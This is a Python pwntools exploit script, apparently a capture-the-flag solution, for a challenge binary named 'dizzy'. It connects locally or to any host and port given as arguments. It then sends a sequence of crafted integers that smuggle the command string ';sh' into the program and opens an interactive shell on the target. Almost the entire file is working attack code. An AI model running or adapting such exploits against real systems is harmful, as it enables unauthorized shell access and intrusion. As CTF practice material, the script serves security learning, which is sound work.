#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './dizzy'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
		host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000001363 # pop rdi ; ret

# elf, libc

# rop1
offset = 0
payload = 'A'*offset
payload += ''

pwn_str = [0x4E767650,0x5331207C,0x20305320,0x41455247,0x733b2154,0x68]
# PvvN| 1S S0 GREAT!;sh
# ru('Let\'s play this!')
# 5times
for i in pwn_str:
    sl(str(i-0x1BF52))
# 10times
for i in range(9):
    sl(str(0-0x1BF52))
# 1
sl(str(0xFEDE00AF-0x1BF52))
# 3times
for i in range(3):
    sl(str(0-0x1BF52))
# debug()
# 1
sl(str(0-0x1BF52))
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

